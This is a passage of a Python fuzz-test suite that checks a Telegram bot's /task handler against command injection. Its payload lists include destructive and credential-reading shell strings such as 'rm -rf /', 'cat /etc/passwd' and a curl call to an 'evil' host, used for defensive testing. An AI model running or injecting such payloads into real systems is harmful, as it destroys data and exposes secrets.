"""Story 3.8 — Command-injection fuzz suite (FR45 / NFR-S5).

Hypothesis-based property test that drives synthesised hostile operator
inputs through the bot's ``/task`` command handler end-to-end:

    Telegram message → handle_task → RegistryAPIClient → POST /v1/tasks
        → EventLogWriter (JSONL append) → reply

For every generated ``description`` the harness asserts ALL of:

  1. **No subprocess invocation.** ``_subprocess_guard`` (autouse) replaces
     every ``subprocess`` / ``os.system`` / ``os.popen`` entry point with an
     ``AssertionError``-raising stub.  Defense-in-depth runtime peer to the
     static AST guard ``scripts/check_no_subprocess.py`` (Story 3.8 AC-6).
  2. **JSON-encoded body field.** The outbound HTTP request from telegram-
     gateway carries the input under ``request_body["title"]`` as a Python
     ``str``; never in the URL path, query string, or any header value.
  3. **Verbatim event-log persistence.** The ``task.created`` event payload
     written to JSONL contains the input character-for-character (UTF-8 +
     JSON escaping is reversible for any unicode codepoint, including
     ``\\x00``).
  4. **No exception escapes the handler.** ``handle_task`` always returns
     normally; the bot replies (success or RFC 7807 error) without raising.

Test inventory:

  - ``test_no_command_injection_through_task_handler``
        Combined 10K-example fuzz across all six attack classes
        (``_attack_input_strategy``).  ``@pytest.mark.slow`` excludes from
        the PR-gate ``just test`` lane; runs in nightly + ``just test-fuzz``.
  - ``test_no_injection_through_null_bytes`` ... ``_git_refname_patterns``
        Six per-strategy 500-example targeted tests.  ``@pytest.mark.fuzz``
        ONLY (NOT ``slow``) so they run on PR gate at ~30-45 s budget.

Strategies cover the NFR-S5 attack classes (prd.md:925):
  - null bytes (``\\x00``)
  - shell metacharacters (``; & | $ \\` $( ) > < \\n``)
  - nested quoting (single/double/backtick quotes with potential closure)
  - directory traversal (``../``, ``..\\``, ``%2e%2e/``)
  - ANSI escapes (``\\x1b[<n>m`` terminal control sequences)
  - git ref-name injection (branch-name shaped strings with embedded metas)

The ``/retry hint=`` fuzz coverage is deferred to Story 3.18 (which ships
the ``/retry`` command); this story covers ``/task`` only.

References:
  - prd.md:875  FR45 (input sanitization)
  - prd.md:925  NFR-S5 (command injection prevention)
  - architecture.md:114  Hypothesis chosen as fuzz lib
  - architecture.md:346  ``@pytest.mark.fuzz`` reserved for this story
  - architecture.md:753  canonical placement of this file
"""

from __future__ import annotations

import asyncio
import contextlib
import json as _json
import os as _os
import subprocess as _subprocess
import sys as _sys
import uuid as _uuid
from collections.abc import Iterator
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock

import httpx
import pytest
from aiogram import Bot
from aiogram.types import Message, User
from asgi_lifespan import LifespanManager
from events import (  # Story 2.9 AC-16
    FROZEN_EPOCH,
    FrozenClock,
    TaskCreatedPayload,
)
from events.schema_registry import register as _register_event
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st
from registry_api.app import build_app
from registry_state.adapters.event_log import (  # noqa: IMP001 — Story 2.9 AC-16
    current_day_path,
)
from registry_state.adapters.sqlite_store import (  # noqa: IMP001 — Story 2.9 AC-16
    create_engine as _create_engine,
)
from registry_state.schema import Base  # noqa: IMP001 — Story 2.9 AC-16
from telegram_gateway.handlers.registry_client import (  # noqa: IMP001 — Story 2.9 AC-16
    RegistryAPIClient,
)
from telegram_gateway.handlers.task_command import (  # noqa: IMP001 — Story 2.9 AC-16
    handle_task,
)

# ---------------------------------------------------------------------------
# Hypothesis strategies — six NFR-S5 attack classes
# ---------------------------------------------------------------------------

# Cap the base-text component at 200 chars per spec (Hypothesis runs many
# examples; small strings keep memory + wall-clock bounded under 10K runs).
_MAX_BASE_LEN = 200

# Bounded text strategy reused by every composite — keeps the surrounding
# valid text small so the attack pattern dominates the generated example.
_BASE_TEXT = st.text(min_size=0, max_size=_MAX_BASE_LEN)


@st.composite
def _null_byte_strategy(draw: st.DrawFn) -> str:
    """NFR-S5 attack class #1 — null-byte injection.

    Embeds ``\\x00`` at random offsets within otherwise-valid text. The
    classical C-string truncation vector: a downstream consumer that
    forwards the value to a ``char*`` API would silently truncate at the
    first null. The platform is pure Python + JSON, so the byte must
    survive verbatim through the round-trip.
    """
    base = draw(_BASE_TEXT)
    nulls = draw(st.lists(st.just("\x00"), min_size=1, max_size=20))
    insert_at = draw(st.integers(min_value=0, max_value=max(0, len(base))))
    return (base[:insert_at] + "".join(nulls) + base[insert_at:])[:_MAX_BASE_LEN]


_SHELL_METAS: list[str] = [";", "&", "|", "$", "`", "$(", ")", ">", "<", "\n", "&&", "||"]


@st.composite
def _shell_metachar_strategy(draw: st.DrawFn) -> str:
    """NFR-S5 attack class #2 — shell metacharacters.

    Mixes ``; & | $ \\` $( ) > < \\n`` with arbitrary text. If any service
    on the request path ever interpolated the input into a ``sh -c`` style
    command, these characters would escape the intended quoting.

    Story 3.8 review H7: GUARANTEES at least one shell-metacharacter is
    drawn (the previous ``st.lists(one_of(metas, _BASE_TEXT), min_size=1)``
    could legitimately pick text every iteration, producing examples with
    zero attack characters and silently degrading coverage).
    """
    payloads = draw(st.lists(st.sampled_from(_SHELL_METAS), min_size=1, max_size=10))
    text_fragments = draw(st.lists(_BASE_TEXT, max_size=10))
    parts: list[str] = list(payloads) + list(text_fragments)
    parts = draw(st.permutations(parts))
    return "".join(parts)[:_MAX_BASE_LEN]


_QUOTE_PAYLOADS: list[str] = [
    "'",
    '"',
    "`",
    "\\'",
    '\\"',
    "''",
    '""',
    "``",
    "'\"",
    "\"'",
    "`\"'",
]


@st.composite
def _nested_quoting_strategy(draw: st.DrawFn) -> str:
    """NFR-S5 attack class #3 — nested quoting.

    Combinations of single, double, and backtick quotes with potential
    closure-and-reopen sequences. Catches naive sanitisers that strip one
    quote variant but not another.

    Story 3.8 review H7: GUARANTEES at least one quote payload is drawn.
    """
    payloads = draw(st.lists(st.sampled_from(_QUOTE_PAYLOADS), min_size=1, max_size=10))
    text_fragments = draw(st.lists(_BASE_TEXT, max_size=10))
    parts: list[str] = list(payloads) + list(text_fragments)
    parts = draw(st.permutations(parts))
    return "".join(parts)[:_MAX_BASE_LEN]


# Story 3.8 review M20: dropped ``/etc/passwd`` and ``C:\\Windows\\System32``
# absolute-path samples — those test absolute-path handling, not traversal.
# A future ``_absolute_path_strategy`` could carry them if needed; the spec
# (NFR-S5 attack class #4) lists only traversal sequences.
_TRAVERSAL_PAYLOADS: list[str] = [
    "../",
    "..\\",
    "%2e%2e/",
    "%2E%2E%2F",
    "..%2f",
    "..%5c",
    "....//",
    "..../",
]


@st.composite
def _directory_traversal_strategy(draw: st.DrawFn) -> str:
    """NFR-S5 attack class #4 — directory traversal.

    ``../``, ``..\\``, ``%2e%2e/`` and percent-encoded variants mixed with
    valid path-shaped chars. Forward-compatibility guard: any future
    code path that ever turns the description into a filesystem path
    must still refuse to escape its sandbox.

    Story 3.8 review H7: GUARANTEES at least one traversal payload is drawn.
    """
    payloads = draw(st.lists(st.sampled_from(_TRAVERSAL_PAYLOADS), min_size=1, max_size=10))
    text_fragments = draw(st.lists(_BASE_TEXT, max_size=10))
    parts: list[str] = list(payloads) + list(text_fragments)
    parts = draw(st.permutations(parts))
    return "".join(parts)[:_MAX_BASE_LEN]


_ANSI_PAYLOADS: list[str] = [
    "\x1b[31m",
    "\x1b[32m",
    "\x1b[0m",
    "\x1b[2J",
    "\x1b[H",
    "\x1b[?25l",
    "\x1b[1;31;40m",
    "\x1b[6n",
    "\x1bc",
]


@st.composite
def _ansi_escape_strategy(draw: st.DrawFn) -> str:
    """NFR-S5 attack class #5 — ANSI terminal escapes.

    ``\\x1b[<n>m`` colour / cursor-control sequences, ``\\x1b[2J`` clear-
    screen, ``\\x1b[?25l`` cursor-hide. A log viewer or terminal client
    that renders the description verbatim would interpret these; the
    platform's structured logging redaction must keep them as opaque
    payload bytes.

    Story 3.8 review H7: GUARANTEES at least one ANSI payload is drawn.
    """
    payloads = draw(st.lists(st.sampled_from(_ANSI_PAYLOADS), min_size=1, max_size=10))
    text_fragments = draw(st.lists(_BASE_TEXT, max_size=10))
    parts: list[str] = list(payloads) + list(text_fragments)
    parts = draw(st.permutations(parts))
    return "".join(parts)[:_MAX_BASE_LEN]


_GIT_REF_BASES: list[str] = [
    "main",
    "master",
    "develop",
    "release/v1.0",
    "feat/foo",
    "fix/bar",
    "HEAD",
    "refs/heads/main",
]
_GIT_REF_PAYLOADS: list[str] = [
    "; rm -rf /",
    "&& echo pwned",
    " || curl http://evil",
    "$(touch /tmp/x)",
    "`whoami`",
    "; cat /etc/passwd",
    " > /etc/passwd",
]


@st.composite
def _git_refname_injection_strategy(draw: st.DrawFn) -> str:
    """NFR-S5 attack class #6 — git ref-name injection.

    Branch-name shaped strings with embedded shell metas
    (``main; rm -rf /``, ``feat/x` && curl evil``). Forward-compat:
    Story 5.7 ships the GitHub adapter via HTTPS REST (no git CLI), so
    no service today consumes the description as a refname — but a
    future story that does must not unwittingly expose this surface.

    Story 3.8 review M21: vary payload count (0–2 payloads concatenated)
    and allow payload-only sequences. Old shape was always ``base+payload``
    for a fixed search space of ~56 strings, which 500 examples revisited
    repeatedly. New shape: optional base + 1–3 payloads concatenated, so
    Hypothesis explores a much larger neighborhood.
    """
    base = draw(st.sampled_from(_GIT_REF_BASES + [""]))
    payloads = draw(st.lists(st.sampled_from(_GIT_REF_PAYLOADS), min_size=1, max_size=3))
    return (base + "".join(payloads))[:_MAX_BASE_LEN]


def _attack_input_strategy() -> st.SearchStrategy[str]:
    """Combined strategy — uniformly samples one of the six NFR-S5 classes.

    Story 3.8 review M5: filter empty / whitespace-only descriptions OUT at
    the strategy level. The bot short-circuits on empty input with a "Usage:
    /task <description>" reply that does not exercise the registry path —
    Hypothesis spending 5–10% of its budget on those paths overstates the
    headline 10K-example coverage. The handler's empty-input behavior is
    asserted independently in unit tests for ``handle_task``.
    """
    return st.one_of(
        _null_byte_strategy(),
        _shell_metachar_strategy(),
        _nested_quoting_strategy(),
        _directory_traversal_strategy(),
        _ansi_escape_strategy(),
        _git_refname_injection_strategy(),
    ).filter(lambda s: bool(s.strip()))


# Story 3.8 review L10: AC-2 spec exposes ``_make_*_strategy()`` re-exports
# so individual attack classes can be referenced by targeted unit tests in
# follow-up stories (e.g. Story 3.18 ``/retry hint=`` extension). Trivial
# aliases — the underlying ``@st.composite``-decorated functions ARE the
# strategies; calling them returns a fresh ``SearchStrategy[str]``.
_make_null_byte_strategy = _null_byte_strategy
_make_shell_metachar_strategy = _shell_metachar_strategy
_make_nested_quoting_strategy = _nested_quoting_strategy
_make_directory_traversal_strategy = _directory_traversal_strategy
_make_ansi_escape_strategy = _ansi_escape_strategy
_make_git_refname_injection_strategy = _git_refname_injection_strategy


# ---------------------------------------------------------------------------
# Schema-registry guard
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def _ensure_event_types_registered() -> None:
    """Re-register ``task.created`` for every test (carry-forward from Story 2.13).

    Other test modules call ``unregister_all()`` in autouse teardown; this
    keeps the registry populated for envelope reads in this harness.

    Story 3.8 review L7: defensive try/except so a duplicate-register
    KeyError under pytest-xdist parallelism (or other races) does not
    abort every test after the first.

    Story 3.8 review L19: autouse ordering pinned by definition order in
    this module — pytest applies autouse fixtures in the order they are
    declared at the same scope. Order:
      1. ``_ensure_event_types_registered`` (this fixture; populates the
         schema registry BEFORE the harness boots).
      2. ``_subprocess_guard`` (poisons shell entry points BEFORE the
         harness or any per-example call lands).
    Both run before the test-scoped ``harness`` fixture builds the ASGI
    app. Re-ordering them would risk an ASGI startup that runs without
    the subprocess poison or without the schema registered.
    """
    with contextlib.suppress(KeyError, ValueError):
        # Already registered (e.g. other test modules registered it first,
        # or pytest-xdist worker collision) — vacuously fine, continue.
        _register_event("task.created", "1.0.0", TaskCreatedPayload)


# ---------------------------------------------------------------------------
# Subprocess guard — runtime peer to the AST gate (AC-5.1)
# ---------------------------------------------------------------------------


# Story 3.8 review H5: the runtime guard MUST patch the same surface the
# AST guard scans, otherwise a code path that survives static analysis (a
# new os.exec* family member, say) would silently pass the runtime check.
# Mirror ``_OS_SHELL_ATTRS`` in scripts/check_no_subprocess.py.
_RUNTIME_OS_SHELL_ATTRS: tuple[str, ...] = (
    "system",
    "popen",
    "exec",
    "execv",
    "execve",
    "execvp",
    "execvpe",
    "execl",
    "execle",
    "execlp",
)
_RUNTIME_SUBPROCESS_ATTRS: tuple[str, ...] = (
    "run",
    "Popen",
    "check_call",
    "check_output",
    "call",
)


# Story 3.8 review M1: the guard must be DORMANT during harness setup
# (uvicorn worker init, asyncio child watcher init on POSIX, OpenTelemetry
# instrumentation, etc. could legitimately import-and-call subprocess at
# bootstrap time, and a misleading "forbidden subprocess call" assertion
# during fixture setup would obscure the real issue). The flag flips True
# AFTER ``_Harness._setup`` returns and back to False BEFORE
# ``_Harness._teardown``; per-example calls all run with the flag True.
_GUARD_ACTIVE: dict[str, bool] = {"on": False}


def _forbidden(name: str, real: Any) -> Any:
    """Build a stub that raises ONLY when the guard is active.

    *real* is the original callable captured before patching; when the
    guard is dormant (during harness setup/teardown) the stub forwards to
    the real implementation so legitimate bootstrap-time use still works.
    """

    def _maybe_raise(*args: Any, **kwargs: Any) -> Any:
        if _GUARD_ACTIVE["on"]:
            raise AssertionError(f"forbidden subprocess call: {name}")
        return real(*args, **kwargs)

    return _maybe_raise


class _ForbiddenSubprocessSentinel:
    """Sentinel object for ``sys.modules['subprocess']`` (Story 3.8 review H4).

    Even with module-attribute monkeypatching, a dep that captured a
    reference at import time via ``from subprocess import run`` would still
    hold the original callable. Replacing the module slot on ``sys.modules``
    catches deps that do ``sp = sys.modules['subprocess']; sp.run(...)``
    lazily at runtime.

    The sentinel blocks only KNOWN shell-execution attribute names (matching
    ``_RUNTIME_SUBPROCESS_ATTRS``). Non-callable metadata attributes like
    ``__file__``, ``__name__``, ``__spec__`` etc. are forwarded to the real
    module. This prevents false-positive fires when Hypothesis or other
    test-infrastructure tools introspect ``sys.modules['subprocess']``
    for constant discovery (the Hypothesis ``_get_local_constants()`` path
    reads ``__file__`` on every module during strategy generation).
    """

    def __init__(self, real: Any) -> None:
        self._real = real

    def __getattr__(self, name: str) -> Any:
        if _GUARD_ACTIVE["on"] and name in _RUNTIME_SUBPROCESS_ATTRS:
            raise AssertionError(
                f"forbidden subprocess access: subprocess.{name} "
                "(via sys.modules sentinel — H4 layered defense)"
            )
        return getattr(self._real, name)


@pytest.fixture(autouse=True)
def _subprocess_guard(monkeypatch: pytest.MonkeyPatch) -> Iterator[None]:
    """Replace every ``subprocess`` / ``os`` shell entry point with an asserter.

    Defense in depth — three layers (Story 3.8 review H4 / H5 / M1):

      1. **Module-attribute poisoning.** ``monkeypatch.setattr(_subprocess,
         attr, …)`` replaces every ``run/Popen/check_call/check_output/call``
         on the live module object. Any caller that does ``import subprocess``
         + ``subprocess.run(...)`` hits the asserter.

      2. **``sys.modules`` sentinel (H4).** ``sys.modules['subprocess']`` is
         replaced with a sentinel that raises on EVERY attribute access (when
         the guard is active). Catches deps that captured a private reference
         to the module at import time via ``sp = sys.modules['subprocess']``.

      3. **Full ``os`` shell-attr family (H5).** Patches every member of
         ``_RUNTIME_OS_SHELL_ATTRS`` (system, popen, AND every os.exec*) so
         the runtime coverage matches the AST guard's scan surface.

    Deferred activation (M1) — the asserter is dormant during ASGI harness
    setup (LifespanManager spin-up, asyncio child-watcher init, OpenTelemetry
    instrumentation) so a legitimate bootstrap-time subprocess call doesn't
    surface as a misleading false-positive. The harness flips the flag
    True after setup completes (see ``_Harness._setup``) and False before
    teardown.

    Catches three classes of indirection that the static AST guard misses:
      1. ``__import__("subprocess")`` dynamic imports.
      2. ``importlib.import_module("subprocess")`` dynamic imports.
      3. Third-party deps that themselves invoke ``subprocess`` on the
         request path (e.g. an httpx middleware shelling to ``curl``).

    Both the AST guard AND this runtime guard must be green for NFR-S5
    to be considered satisfied.
    """
    # Snapshot the real callables BEFORE patching so the dormant path can
    # forward to them.
    real_subprocess_attrs: dict[str, Any] = {
        attr: getattr(_subprocess, attr, None) for attr in _RUNTIME_SUBPROCESS_ATTRS
    }
    real_os_attrs: dict[str, Any] = {
        attr: getattr(_os, attr, None) for attr in _RUNTIME_OS_SHELL_ATTRS
    }
    for attr, real in real_subprocess_attrs.items():
        if real is None:
            continue
        monkeypatch.setattr(_subprocess, attr, _forbidden(f"subprocess.{attr}", real))
    for attr, real in real_os_attrs.items():
        if real is None:
            continue
        monkeypatch.setattr(_os, attr, _forbidden(f"os.{attr}", real))
    # H4 — sys.modules sentinel layered on top of attribute patches.
    sentinel = _ForbiddenSubprocessSentinel(_subprocess)
    monkeypatch.setitem(_sys.modules, "subprocess", sentinel)
    # Start dormant; harness flips it True after _setup completes.
    _GUARD_ACTIVE["on"] = False
    try:
        yield
    finally:
        _GUARD_ACTIVE["on"] = False


# ---------------------------------------------------------------------------
# ASGI harness — registry-api in-process via ASGITransport + LifespanManager
# ---------------------------------------------------------------------------

_FROZEN_MONO_NS = 1_000_000


def _db_url(db_path: Path) -> str:
    return f"sqlite+aiosqlite:///{db_path}"


async def _seed_tables(db_url: str) -> None:
    """Create all ORM tables on a writable engine (mirrors idempotency conftest)."""
    engine = _create_engine(db_url)
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    await engine.dispose()


class _Harness:
    """Container for the ASGI + bot-client wiring shared across Hypothesis examples.

    Hypothesis tests are synchronous — they cannot be ``@pytest.mark.asyncio``-
    driven (the ``@given`` decorator runs N examples per pytest "test", and
    pytest-asyncio's once-per-test event loop would shut down between them).
    Solution: own a single ``asyncio`` event loop for the lifetime of the
    harness, drive setup / per-example / teardown via ``loop.run_until_complete``.

    Story 3.4 M10 carry-forward: the inner ``httpx.AsyncClient`` IS still
    constructed inside an ``async with`` block (just one we manage manually),
    so resource cleanup remains guaranteed.

    Story 3.8 review H10: ``events_log_offset`` caches the daily-JSONL file
    size (bytes) seen at the END of the previous example, replacing the
    O(N²) line-count-the-whole-file scan. Each per-example call reads ONLY
    the bytes appended since the cached offset (so the per-example I/O is
    O(1) regardless of total log size).
    """

    def __init__(self) -> None:
        self.loop: asyncio.AbstractEventLoop | None = None
        self.lifespan: LifespanManager | None = None
        self.bot_http: httpx.AsyncClient | None = None
        self.registry_client: RegistryAPIClient | None = None
        self.events_dir: Path | None = None
        self.recorder: _RequestRecorder | None = None
        # Story 3.8 review H10: cached file-size offset for O(1)-per-example
        # delta reads on the daily JSONL log.
        self.events_log_offset: int = 0


@pytest.fixture
def harness(tmp_path: Path) -> Iterator[_Harness]:
    """Sync fixture that owns its own event loop for the Hypothesis run.

    Yields a ``_Harness`` whose ``registry_client`` is wired through
    ``httpx.ASGITransport`` over a real ``build_app(...)`` instance. The
    transport is wrapped in a ``_RequestRecorder`` so every per-example call
    captures the outbound request shape for AC-5.2 assertions.

    Function-scoped — ``HealthCheck.function_scoped_fixture`` is suppressed
    on every Hypothesis test in this file (AC-10) because the harness is
    intentionally reused across examples within a single test invocation
    (rebuilding the ASGI app per example would push the 10K test budget
    well past 10 minutes).
    """
    h = _Harness()
    # Story 3.8 review M3: snapshot the prior event loop (if any) and
    # restore it on teardown — leaving ``asyncio.set_event_loop(None)`` on
    # exit corrupts pytest-asyncio's policy mid-session and causes
    # subsequent integration tests in the same process to hang.
    try:
        prev_loop: asyncio.AbstractEventLoop | None = (
            asyncio.get_event_loop_policy().get_event_loop()
        )
    except RuntimeError:
        prev_loop = None
    loop = asyncio.new_event_loop()
    h.loop = loop
    asyncio.set_event_loop(loop)
    try:
        db_path = tmp_path / "state.sqlite3"
        db_url = _db_url(db_path)
        loop.run_until_complete(_seed_tables(db_url))
        events_dir = tmp_path / "events"
        h.events_dir = events_dir

        clock = FrozenClock(mono_ns=_FROZEN_MONO_NS, now=FROZEN_EPOCH)

        # ``LifespanManager.__init__`` calls ``detect_concurrency_backend()``
        # which uses ``sniffio`` — sniffio only works while a coroutine is
        # actively running. Wrap construction + ``__aenter__`` together in a
        # single coroutine so the manager is built inside the loop's async
        # context.
        #
        # Story 3.8 review M14: startup_timeout=30 (vs 5s default). Cold CI
        # runners + first-run pytest can exceed the 5s default; bumping to
        # 30 keeps the harness flake-free without inflating wall-clock for
        # warm runs.
        async def _setup() -> tuple[LifespanManager, httpx.AsyncClient, _RequestRecorder]:
            app = build_app(
                base_dir=events_dir,
                db_url=db_url,
                clock=clock,
                idempotency_db_url=_db_url(tmp_path / "idempotency.sqlite3"),
                create_idempotency_schema_on_start=True,
            )
            mgr = LifespanManager(app, startup_timeout=30, shutdown_timeout=30)
            await mgr.__aenter__()
            delegate = httpx.ASGITransport(app=mgr.app)
            recorder = _RequestRecorder(delegate)
            client = httpx.AsyncClient(
                transport=recorder,
                base_url="http://registry-api:8080",
            )
            return mgr, client, recorder

        h.lifespan, h.bot_http, h.recorder = loop.run_until_complete(_setup())
        h.registry_client = RegistryAPIClient(http_client=h.bot_http)
        # Story 3.8 review M1: harness is built — flip the guard live.
        # Per-example calls now hit the asserter; setup-time bootstrap
        # subprocess use (if any) ran with the guard dormant.
        _GUARD_ACTIVE["on"] = True

        yield h
    finally:
        # Disarm the guard before teardown so the LifespanManager shutdown
        # path (which can legitimately use subprocess for child-watcher
        # cleanup on POSIX) doesn't trip.
        _GUARD_ACTIVE["on"] = False
        try:

            async def _teardown() -> None:
                if h.bot_http is not None:
                    await h.bot_http.aclose()
                if h.lifespan is not None:
                    await h.lifespan.__aexit__(None, None, None)

            loop.run_until_complete(_teardown())
        finally:
            # Story 3.8 review M3: restore prior loop instead of clobbering.
            asyncio.set_event_loop(prev_loop)
            loop.close()


# ---------------------------------------------------------------------------
# Recorder — wraps the underlying ASGI transport so we can both record the
# outbound request shape (AC-5.2) AND let it reach the registry-api app.
# ---------------------------------------------------------------------------


class _RequestRecorder:
    """Async-callable transport-style recorder.

    Wraps a delegate transport (``ASGITransport`` for the in-process app) and
    captures each outbound request before delegating. Reset between examples.

    Story 3.8 review L6: ``request.content`` materializes a streamed body
    eagerly. The bot's ``RegistryAPIClient.create_task`` posts a small JSON
    object (a single ``{"title": …}`` field) so this is fine today; if a
    future stream-body code path ever lands on this transport, the recorder
    would raise ``RuntimeError`` at this point — visible failure, not a
    silent corruption.
    """

    def __init__(self, delegate: httpx.AsyncBaseTransport) -> None:
        self._delegate = delegate
        self.last: httpx.Request | None = None
        self.last_body: bytes | None = None
        # Story 3.8 review M2: guard against double-close. ``httpx.AsyncClient.
        # aclose()`` calls ``transport.aclose()`` and the underlying
        # ``ASGITransport`` may also be closed independently if the test
        # fixture re-enters teardown.
        self._closed: bool = False

    def reset(self) -> None:
        self.last = None
        self.last_body = None

    async def handle_async_request(self, request: httpx.Request) -> httpx.Response:
        # ``request.content`` is the raw body bytes httpx assembled for us;
        # we record it BEFORE the ASGI app reads the stream so a double-read
        # doesn't surface as an empty body in the recorder. (httpx caches the
        # bytes on the Request object so the delegate read still succeeds.)
        self.last = request
        self.last_body = request.content
        return await self._delegate.handle_async_request(request)

    async def aclose(self) -> None:
        """Forward close to delegate — httpx.AsyncClient.aclose() expects this.

        Story 3.8 review M2: idempotent — second and subsequent calls are
        no-ops to avoid double-close on the underlying ASGITransport.
        """
        if self._closed:
            return
        self._closed = True
        await self._delegate.aclose()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _new_random_id() -> int:
    """Generate a 32-bit positive int from a fresh UUIDv4 (Story 3.8 review M9).

    The Telegram API uses int chat/user IDs; we mint a fresh value per call
    so a Hypothesis-generated description that coincidentally equals
    ``str(<id>)`` cannot accidentally match a header value. 32-bit width
    keeps the ID inside Telegram's documented int range without collisions.
    """
    return _uuid.uuid4().int >> 96  # top 32 bits


def _make_message(text: str, *, message_id: int, chat_id: int, user_id: int) -> MagicMock:
    """Build an aiogram Message mock with strict spec attribute access.

    Story 3.8 review M8: ``MagicMock(spec=Message)`` so a future handler
    bug that tried to read ``msg.caption`` instead of ``msg.text`` would
    raise AttributeError instead of silently proxying through MagicMock's
    free-form attribute generation.

    Story 3.8 review M9: ``message_id``, ``chat_id``, ``user_id`` are
    caller-provided unique values (not the old hardcoded 42/100/999) so
    a Hypothesis description can never coincidentally match an identity
    header value.
    """
    msg = MagicMock(spec=Message)
    msg.text = text
    msg.message_id = message_id
    msg.chat = MagicMock()
    msg.chat.id = chat_id
    msg.from_user = MagicMock(spec=User)
    msg.from_user.id = user_id
    msg.reply = AsyncMock(return_value=None)
    return msg


# Story 3.8 review L9: hoisted to module scope as a frozenset so we don't
# allocate it on every per-example assertion call (10K allocations on the
# combined fuzz test).
#
# Story 3.8 review L26: the allowlist is intentionally narrow — bot-CONTROLLED
# identity headers whose values the bot computes from message ids (UUIDv5/UUIDv7/
# int). Generic transport headers (``content-type``, ``accept``, ``host``,
# ``user-agent``) are excluded because their values are constants the operator
# input could COINCIDENTALLY equal — that coincidence is not a leak.
_BOT_IDENTITY_HEADERS: frozenset[str] = frozenset(
    {
        "idempotency-key",
        "x-idempotency-key",
        "x-request-id",
        "x-actor-id",
    }
)

# Story 3.8 review M22: the bot's RegistryAPIClient.create_task posts a body
# with exactly one key — ``title``. If a future regression smuggles the input
# into a different field (``raw``, ``description``, etc.), the strict-equality
# key-set assertion below will fail.
# Story 3.9 AC-5: chat_id + reply_to_message_id are now forwarded by
# handle_task when the message carries them (always the case for bot-originating
# commands — chat.id and message_id are always present on an aiogram Message).
#
# H9 review fix: relaxed from exact equality to subset check so future
# fields (repo, hint, etc.) added to CreateTaskRequest do not trip the
# injection-prevention assertion — safety is about content of KNOWN fields,
# not exact key-set equality.  _FORBIDDEN_BODY_KEYS tracks fields that must
# NEVER carry user-controlled content; populate as the platform develops.
_EXPECTED_BODY_KEYS: frozenset[str] = frozenset({"title", "chat_id", "reply_to_message_id"})
_FORBIDDEN_BODY_KEYS: frozenset[str] = frozenset()  # populated as the platform develops


def _file_size(path: Path) -> int:
    """Return ``path`` size in bytes, or 0 if it does not exist (yet)."""
    try:
        return path.stat().st_size
    except FileNotFoundError:
        return 0


def _read_log_bytes_since(events_dir: Path, offset: int) -> tuple[bytes, int]:
    """Read the daily-JSONL file from ``offset`` to EOF.

    Story 3.8 review H10: O(1) per example regardless of total log size.
    Returns ``(new_bytes, new_offset)`` where ``new_offset`` is the file
    size at the moment of the read (= offset + len(new_bytes) by definition).

    Frozen clock keeps writes pinned to a single daily file (see Story 2.4),
    so we only ever need to read one path. If the path does not exist
    yet (no events emitted in this harness lifetime), returns ``(b"", 0)``.
    """
    log_path = current_day_path(events_dir, FROZEN_EPOCH)
    if not log_path.exists():
        return b"", 0
    with log_path.open("rb") as f:
        f.seek(offset)
        new_bytes = f.read()
    return new_bytes, offset + len(new_bytes)


def _expected_title(description: str) -> str:
    """Return the value the bot's ``RegistryAPIClient.create_task`` body field
    will carry, given the operator-supplied ``description``.

    Story 3.8 review M4: capturing the bot's transformation explicitly here
    makes a future handler-trim regression visible (today the handler does
    ``description.strip()`` before posting). If the production code stops
    stripping (or strips differently), the resulting test breakage points
    at THIS helper, signalling exactly the contract that changed.
    """
    return description.strip()


def _assert_input_safety(
    description: str,
    *,
    recorder: _RequestRecorder,
    events_dir: Path,
    log_offset_before: int,
) -> int:
    """Assert AC-5 properties for one fuzz example.

    Returns the new ``log_offset`` (caller caches it on the harness for the
    next example — Story 3.8 review H10).

    Property breakdown:
      (1) No subprocess call — enforced by ``_subprocess_guard`` autouse
          fixture; nothing to assert here (any forbidden call would have
          already raised AssertionError).
      (2) JSON-encoded body field — the recorder captured a POST whose
          body is a JSON object with ``title == _expected_title(description)``.
          The input must NEVER appear in the URL path, query string, or any
          bot-controlled identity header value.
      (3) Verbatim event-log persistence — at least one new envelope landed
          since the previous example AND the JSON wire-form of the input
          appears verbatim in the appended bytes (Story 3.8 review H6).
      (4) No exception escape — the call site does not raise; ``handle_task``
          is contract-bound to absorb everything (Story 3.1 M3).
    """
    # The strategy-level filter (Story 3.8 review M5) drops empty/whitespace
    # descriptions, so the recorder MUST have captured a request.
    assert recorder.last is not None, (
        f"recorder captured no request for non-empty description: {description!r}"
    )

    # AC-5.2 — JSON body shape, input never in URL / headers.
    req = recorder.last
    assert req.method == "POST", f"unexpected method: {req.method!r}"
    assert req.url.path == "/v1/tasks", f"unexpected path: {req.url.path!r}"
    assert not req.url.query, f"unexpected query string: {req.url.query!r}"

    body_bytes = recorder.last_body or b""
    body_obj = _json.loads(body_bytes.decode("utf-8"))
    assert isinstance(body_obj, dict), f"body not a JSON object: {body_obj!r}"
    # H9 review fix: subset check — required fields must all be present, but
    # future fields (repo, hint, etc.) are permitted without tripping this gate.
    assert _EXPECTED_BODY_KEYS.issubset(body_obj.keys()), (
        f"required body keys missing: "
        f"got {sorted(body_obj.keys())}, expected subset {sorted(_EXPECTED_BODY_KEYS)}"
    )
    # H9: no forbidden fields may be present (empty today; populate as needed).
    forbidden_found = _FORBIDDEN_BODY_KEYS.intersection(body_obj.keys())
    assert not forbidden_found, f"forbidden body keys present: {sorted(forbidden_found)}"
    title_field = body_obj["title"]
    assert isinstance(title_field, str), (
        f"'title' field is not a JSON string: {type(title_field).__name__}"
    )
    expected = _expected_title(description)
    assert title_field == expected, (
        f"title field did not round-trip: expected {expected!r}, body has {title_field!r}"
    )

    # Story 3.8 review L26: bot-CONTROLLED identity headers must never
    # carry the input verbatim. Generic transport headers excluded —
    # see ``_BOT_IDENTITY_HEADERS`` module-scope docstring.
    if description:
        for header_name, header_value in req.headers.items():
            if header_name.lower() not in _BOT_IDENTITY_HEADERS:
                continue
            assert header_value != description, (
                f"description leaked into bot-controlled header {header_name!r}"
            )

    # AC-5.3 — verbatim persistence (Story 3.8 review H6 + H8).
    #
    # H8 — assert at least one envelope was appended to the daily JSONL log.
    # Relaxed from the original strict ``== +1`` to ``bytes_delta > 0``: a
    # concurrent audit-event/heartbeat/idempotency-reaper landing during an
